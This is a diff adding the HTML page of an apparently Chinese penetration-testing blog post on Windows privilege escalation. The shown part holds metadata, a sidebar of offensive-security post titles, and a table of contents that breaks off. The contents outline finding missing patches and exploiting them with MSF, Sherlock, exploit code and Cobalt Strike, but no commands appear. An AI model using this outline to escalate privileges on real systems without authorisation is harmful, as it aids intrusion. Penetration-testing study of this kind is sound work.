@@ -1,0 +1,1014 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>内网渗透-提权 | Beret-81</title>
+  <meta name="keywords" content=" 信息收集、学习记录 ">
+  <meta name="description" content="内网渗透-提权 | Beret-81">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="IIS 漏洞总结 IIS是Internet Information Services的缩写，意为互联网信息服务，是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。 IIS目前只适用于Windows系统，不适用于其他操作系统。  1、文件解析漏洞1.1 目录解析漏洞在 IIS5.x&#x2F;6.0 中，默认会将 *.asp（.asa、.cer、.cdx ）目录下的所有文件当成As">
+<meta property="og:type" content="article">
+<meta property="og:title" content="IIS 漏洞总结">
+<meta property="og:url" content="http://yoursite.com/2020/08/16/IIS-%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="Beret-81">
+<meta property="og:description" content="IIS 漏洞总结 IIS是Internet Information Services的缩写，意为互联网信息服务，是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。 IIS目前只适用于Windows系统，不适用于其他操作系统。  1、文件解析漏洞1.1 目录解析漏洞在 IIS5.x&#x2F;6.0 中，默认会将 *.asp（.asa、.cer、.cdx ）目录下的所有文件当成As">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200329142648132.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjkxODc3MQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200329142912889.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjkxODc3MQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200329142938674.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200329142946226.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjkxODc3MQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2020032914503617.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjkxODc3MQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200329145243481.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjkxODc3MQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200329145405754.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjkxODc3MQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200329145828764.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjkxODc3MQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200329145843318.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjkxODc3MQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200329150114518.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200329150332318.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjkxODc3MQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200329150353404.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjkxODc3MQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2020032915040683.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjkxODc3MQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200329150444629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjkxODc3MQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200329150450861.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200329150505400.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200329150510867.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200329151627797.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjkxODc3MQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200329150540836.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjkxODc3MQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200329150737904.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjkxODc3MQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200329151152313.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjkxODc3MQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200329151204570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjkxODc3MQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200329151216379.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200329151229304.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjkxODc3MQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200329151239891.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2020032915124591.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjkxODc3MQ==,size_16,color_FFFFFF,t_70">
+<meta property="article:published_time" content="2020-08-16T09:03:53.000Z">
+<meta property="article:modified_time" content="2020-08-21T06:40:40.163Z">
+<meta property="article:author" content="Beret-81">
+<meta property="article:tag" content="IIS 漏洞、中间件漏洞">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20200329142648132.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjkxODc3MQ==,size_16,color_FFFFFF,t_70">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.1.0" rel="stylesheet">
+
+<link href="/css/hl_theme/atom-light.css?v=1.1.0" rel="stylesheet">
+
+<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">
+
+<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="/js/titleTip.js?v=1.1.0" ></script>
+
+<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/jquery.cookie@1.4.1/jquery.cookie.min.js" ></script>
+
+<script src="/js/iconfont.js?v=1.1.0" ></script>
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="">
+  <input class="theme_blog_path" value="">
+  <input id="theme_shortcut" value="true" />
+</div>
+
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/" class="avatar_target">
+    <img class="avatar" src="/img/avatar.jpg" />
+</a>
+<div class="author">
+    <span>Beret-81</span>
+</div>
+
+<div class="icon">
+    
+        
+        <a title="github" href="https://github.com/beret-81" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-github"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="csdn" href="https://blog.csdn.net/weixin_42918771" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-csdn"></use>
+                </svg>
+            
+        </a>
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li><div class="all active" data-rel="All">All<small>(31)</small></div></li>
+    
+        
+            
+            <li><div data-rel="内网渗透">内网渗透<small>(11)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="基础杂项">基础杂项<small>(3)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="工具使用">工具使用<small>(4)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="应急响应">应急响应<small>(5)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="渗透测试">渗透测试<small>(4)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="漏洞集合">漏洞集合<small>(2)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="资源汇总">资源汇总<small>(1)</small></div>
+                
+            </li>
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+    
+    
+    
+    
+    </div>
+    <div></div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="31">
+
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        Links
+        <i class="iconfont icon-left"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="http://yelog.org/">叶落阁</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <div class="right-top">
+        <div id="default-panel">
+            <i class="iconfont icon-search" data-title="搜索 快捷键 i"></i>
+            <div class="right-title">All</div>
+            <i class="iconfont icon-file-tree" data-title="切换到大纲视图 快捷键 w"></i>
+        </div>
+        <div id="search-panel">
+            <i class="iconfont icon-left" data-title="返回"></i>
+            <input id="local-search-input" />
+            <label class="border-line" for="input"></label>
+            <i class="iconfont icon-case-sensitive" data-title="大小写敏感"></i>
+            <i class="iconfont icon-tag" data-title="标签"></i>
+        </div>
+        <div id="outline-panel" style="display: none">
+            <div class="right-title">大纲</div>
+            <i class="iconfont icon-list" data-title="切换到文章列表"></i>
+        </div>
+    </div>
+
+    <div class="tags-list">
+    <input id="tag-search" />
+    <div class="tag-wrapper">
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>IIS 漏洞、中间件漏洞</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Linux 命令</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Tomcat 漏洞、中间件漏洞</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Window 命令</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>信息收集</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>信息收集、学习记录</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>反弹shell</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>密码抓取</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>工具使用、日志分析</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>工具使用、渗透测试</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>应急响应</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>应急响应、日志分析</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>文件下载</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>渗透测试、信息收集</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>网络基础</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>资源汇总</a>
+            </li>
+        
+    </div>
+
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        <a  class="All 漏洞集合 "
+           href="/2020/08/16/IIS-%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"
+           data-tag="IIS 漏洞、中间件漏洞"
+           data-author="" >
+            <span class="post-title" title="IIS 漏洞总结">IIS 漏洞总结</span>
+            <span class="post-date" title="2020-08-16 17:03:53">2020/08/16</span>
+        </a>
+        
+        <a  class="All 漏洞集合 "
+           href="/2020/08/14/Tomcat-%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"
+           data-tag="Tomcat 漏洞、中间件漏洞"
+           data-author="" >
+            <span class="post-title" title="Tomcat 漏洞总结">Tomcat 漏洞总结</span>
+            <span class="post-date" title="2020-08-14 16:03:52">2020/08/14</span>
+        </a>
+        
+        <a  class="All 渗透测试 "
+           href="/2020/08/13/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/"
+           data-tag="文件下载"
+           data-author="" >
+            <span class="post-title" title="渗透测试--文件下载">渗透测试--文件下载</span>
+            <span class="post-date" title="2020-08-13 16:54:42">2020/08/13</span>
+        </a>
+        
+        <a  class="All 渗透测试 "
+           href="/2020/08/13/%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF/"
+           data-tag="反弹shell"
+           data-author="" >
+            <span class="post-title" title="反弹shell的各种姿势">反弹shell的各种姿势</span>
+            <span class="post-date" title="2020-08-13 08:59:42">2020/08/13</span>
+        </a>
+        
+        <a  class="All "
+           href="/2020/08/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%B5%84%E6%BA%90%E7%BD%91%E7%AB%99/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="渗透测试-资源网站">渗透测试-资源网站</span>
+            <span class="post-date" title="2020-08-07 11:59:55">2020/08/07</span>
+        </a>
+        
+        <a  class="All 应急响应 "
+           href="/2020/08/04/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-Log-Parser-%E5%B7%A5%E5%85%B7/"
+           data-tag="工具使用、日志分析"
+           data-author="" >
+            <span class="post-title" title="日志分析-Log Parser 工具">日志分析-Log Parser 工具</span>
+            <span class="post-date" title="2020-08-04 22:50:16">2020/08/04</span>
+        </a>
+        
+        <a  class="All 应急响应 "
+           href="/2020/08/03/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-Windows-%E6%97%A5%E5%BF%97/"
+           data-tag="应急响应、日志分析"
+           data-author="" >
+            <span class="post-title" title="日志分析--windows日志">日志分析--windows日志</span>
+            <span class="post-date" title="2020-08-03 22:30:56">2020/08/03</span>
+        </a>
+        
+        <a  class="All 应急响应 "
+           href="/2020/08/03/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%EF%BC%88EVENT-ID%EF%BC%89/"
+           data-tag="应急响应、日志分析"
+           data-author="" >
+            <span class="post-title" title="日志分析- 安全事件（EVENT ID）">日志分析- 安全事件（EVENT ID）</span>
+            <span class="post-date" title="2020-08-03 22:30:56">2020/08/03</span>
+        </a>
+        
+        <a  class="All 应急响应 "
+           href="/2020/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-lLinux%20%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/"
+           data-tag="应急响应"
+           data-author="" >
+            <span class="post-title" title="应急响应--Linux 入侵排查">应急响应--Linux 入侵排查</span>
+            <span class="post-date" title="2020-08-03 21:50:30">2020/08/03</span>
+        </a>
+        
+        <a  class="All 应急响应 "
+           href="/2020/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-window%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/"
+           data-tag="应急响应"
+           data-author="" >
+            <span class="post-title" title="应急响应--window入侵排查">应急响应--window入侵排查</span>
+            <span class="post-date" title="2020-08-03 21:50:16">2020/08/03</span>
+        </a>
+        
+        <a  class="All 资源汇总 "
+           href="/2020/07/31/%E7%BA%A2%E9%98%9F%E5%92%8C%E8%93%9D%E9%98%9F%E8%B5%84%E6%BA%90%E6%B1%87%E6%80%BB/"
+           data-tag="资源汇总"
+           data-author="" >
+            <span class="post-title" title="红队和蓝队资料汇总">红队和蓝队资料汇总</span>
+            <span class="post-date" title="2020-07-31 14:41:49">2020/07/31</span>
+        </a>
+        
+        <a  class="All 基础杂项 "
+           href="/2020/07/15/100%E4%B8%AA%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"
+           data-tag="网络基础"
+           data-author="" >
+            <span class="post-title" title="100个网络基础知识">100个网络基础知识</span>
+            <span class="post-date" title="2020-07-15 21:40:39">2020/07/15</span>
+        </a>
+        
+        <a  class="All 内网渗透 "
+           href="/2020/02/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91/"
+           data-tag="信息收集、学习记录"
+           data-author="" >
+            <span class="post-title" title="内网渗透-域内横向">内网渗透-域内横向</span>
+            <span class="post-date" title="2020-02-08 22:11:45">2020/02/08</span>
+        </a>
+        
+        <a  class="All 渗透测试 "
+           href="/2020/02/08/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%8E%B7%E5%8F%96Windows%E7%B3%BB%E7%BB%9F%E6%95%A3%E5%88%97%E5%80%BC/"
+           data-tag="密码抓取"
+           data-author="" >
+            <span class="post-title" title="渗透测试-获取Windows系统散列值">渗透测试-获取Windows系统散列值</span>
+            <span class="post-date" title="2020-02-08 22:11:45">2020/02/08</span>
+        </a>
+        
+        <a  class="All 内网渗透 "
+           href="/2020/02/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E6%8F%90%E6%9D%83/"
+           data-tag="信息收集、学习记录"
+           data-author="" >
+            <span class="post-title" title="内网渗透-提权">内网渗透-提权</span>
+            <span class="post-date" title="2020-02-05 12:46:34">2020/02/05</span>
+        </a>
+        
+        <a  class="All 内网渗透 "
+           href="/2020/02/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%8A%E4%BC%A0%E4%B8%8E%E4%B8%8B%E8%BD%BD/"
+           data-tag="信息收集、学习记录"
+           data-author="" >
+            <span class="post-title" title="内网渗透--上传与下载">内网渗透--上传与下载</span>
+            <span class="post-date" title="2020-02-04 16:46:34">2020/02/04</span>
+        </a>
+        
+        <a  class="All 内网渗透 "
+           href="/2020/02/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%8E%8B%E7%BC%A9%E6%95%B0%E6%8D%AE/"
+           data-tag="信息收集、学习记录"
+           data-author="" >
+            <span class="post-title" title="内网渗透--压缩数据">内网渗透--压缩数据</span>
+            <span class="post-date" title="2020-02-04 15:16:04">2020/02/04</span>
+        </a>
+        
+        <a  class="All 内网渗透 "
+           href="/2020/02/03/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%BB%BA%E7%AB%8B%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93/"
+           data-tag="信息收集、学习记录"
+           data-author="" >
+            <span class="post-title" title="内网渗透--建立隐藏通信隧道">内网渗透--建立隐藏通信隧道</span>
+            <span class="post-date" title="2020-02-03 10:36:29">2020/02/03</span>
+        </a>
+        
+        <a  class="All 内网渗透 "
+           href="/2020/02/02/%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93-%E5%88%A4%E6%96%AD%E5%86%85%E7%BD%91%E8%BF%9E%E9%80%9A%E6%80%A7/"
+           data-tag="信息收集、学习记录"
+           data-author="" >
+            <span class="post-title" title="隐藏通信隧道-判断内网连通性">隐藏通信隧道-判断内网连通性</span>
+            <span class="post-date" title="2020-02-02 12:06:49">2020/02/02</span>
+        </a>
+        
+        <a  class="All 内网渗透 "
+           href="/2020/01/26/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"
+           data-tag="信息收集、学习记录"
+           data-author="" >
+            <span class="post-title" title="信息收集--域内信息收集">信息收集--域内信息收集</span>
+            <span class="post-date" title="2020-01-26 21:17:21">2020/01/26</span>
+        </a>
+        
+        <a  class="All 内网渗透 "
+           href="/2020/01/26/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B/"
+           data-tag="信息收集、学习记录"
+           data-author="" >
+            <span class="post-title" title="信息收集--端口探测">信息收集--端口探测</span>
+            <span class="post-date" title="2020-01-26 15:07:01">2020/01/26</span>
+        </a>
+        
+        <a  class="All 内网渗透 "
+           href="/2020/01/26/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E4%B8%BB%E6%9C%BA%E5%AD%98%E6%B4%BB/"
+           data-tag="信息收集、学习记录"
+           data-author="" >
+            <span class="post-title" title="信息收集--主机存活">信息收集--主机存活</span>
+            <span class="post-date" title="2020-01-26 13:06:49">2020/01/26</span>
+        </a>
+        
+        <a  class="All 内网渗透 "
+           href="/2020/01/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E6%9C%89%E5%9F%9F/"
+           data-tag="信息收集"
+           data-author="" >
+            <span class="post-title" title="信息收集--判断是否有域">信息收集--判断是否有域</span>
+            <span class="post-date" title="2020-01-25 15:28:49">2020/01/25</span>
+        </a>
+        
+        <a  class="All 内网渗透 "
+           href="/2020/01/24/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%9C%AC%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"
+           data-tag="信息收集、学习记录"
+           data-author="" >
+            <span class="post-title" title="信息收集--本机信息">信息收集--本机信息</span>
+            <span class="post-date" title="2020-01-24 17:33:34">2020/01/24</span>
+        </a>
+        
+        <a  class="All 渗透测试 "
+           href="/2019/12/04/%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E5%9C%A8%E7%BA%BF%E7%BD%91%E7%AB%99/"
+           data-tag="渗透测试、信息收集"
+           data-author="" >
+            <span class="post-title" title="被动信息收集--在线网站">被动信息收集--在线网站</span>
+            <span class="post-date" title="2019-12-04 12:53:21">2019/12/04</span>
+        </a>
+        
+        <a  class="All 工具使用 "
+           href="/2019/03/05/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8--mimikatz/"
+           data-tag="工具使用、渗透测试"
+           data-author="" >
+            <span class="post-title" title="工具使用--mimikatz">工具使用--mimikatz</span>
+            <span class="post-date" title="2019-03-05 12:56:21">2019/03/05</span>
+        </a>
+        
+        <a  class="All 工具使用 "
+           href="/2019/03/04/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8--MSF/"
+           data-tag="工具使用、渗透测试"
+           data-author="" >
+            <span class="post-title" title="工具使用--MSF">工具使用--MSF</span>
+            <span class="post-date" title="2019-03-04 22:06:21">2019/03/04</span>
+        </a>
+        
+        <a  class="All 工具使用 "
+           href="/2019/03/04/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8--Msfvenom/"
+           data-tag="工具使用、渗透测试"
+           data-author="" >
+            <span class="post-title" title="工具使用--Msfvenom">工具使用--Msfvenom</span>
+            <span class="post-date" title="2019-03-04 21:06:21">2019/03/04</span>
+        </a>
+        
+        <a  class="All 工具使用 "
+           href="/2019/03/03/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8--NetCat/"
+           data-tag="工具使用、渗透测试"
+           data-author="" >
+            <span class="post-title" title="工具使用--NetCat">工具使用--NetCat</span>
+            <span class="post-date" title="2019-03-03 12:36:29">2019/03/03</span>
+        </a>
+        
+        <a  class="All 基础杂项 "
+           href="/2017/09/30/Linux-%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8/"
+           data-tag="Linux 命令"
+           data-author="" >
+            <span class="post-title" title="Linux 命令大全">Linux 命令大全</span>
+            <span class="post-date" title="2017-09-30 11:29:15">2017/09/30</span>
+        </a>
+        
+        <a  class="All 基础杂项 "
+           href="/2017/09/15/Window-%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8/"
+           data-tag="Window 命令"
+           data-author="" >
+            <span class="post-title" title="Window 命令大全">Window 命令大全</span>
+            <span class="post-date" title="2017-09-15 15:29:35">2017/09/15</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="切换全屏 快捷键 s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-内网渗透-提权" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">内网渗透-提权</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="内网渗透">内网渗透</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color5">信息收集、学习记录</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+            Created At : <time class="date" title='Updated At: 2020-09-16 11:06:13'>2020-02-05 12:46</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            Views 👀 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#内网渗透-权限提升"><span class="toc-text">内网渗透-权限提升</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#一、系统内核溢出漏洞提权"><span class="toc-text">一、系统内核溢出漏洞提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1、查看缺失补丁"><span class="toc-text">1、查看缺失补丁</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#使用手工查看补丁情况"><span class="toc-text">使用手工查看补丁情况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用-Window-Exploit-Suggester-工具"><span class="toc-text">使用 Window Exploit Suggester 工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用-MSF-查看缺失补丁"><span class="toc-text">使用 MSF 查看缺失补丁</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用-PowerShell中的Sherlock-脚本"><span class="toc-text">使用 PowerShell中的Sherlock 脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2、利用缺失补丁"><span class="toc-text">2、利用缺失补丁</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1、powershell提权"><span class="toc-text">1、powershell提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2、使用-MSF-进行提权"><span class="toc-text">2、使用 MSF 进行提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3、使用对应漏洞的exp-进行提权"><span class="toc-text">3、使用对应漏洞的exp 进行提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4、使用-CS-进行提权"><span class="toc-text">4、使用 CS 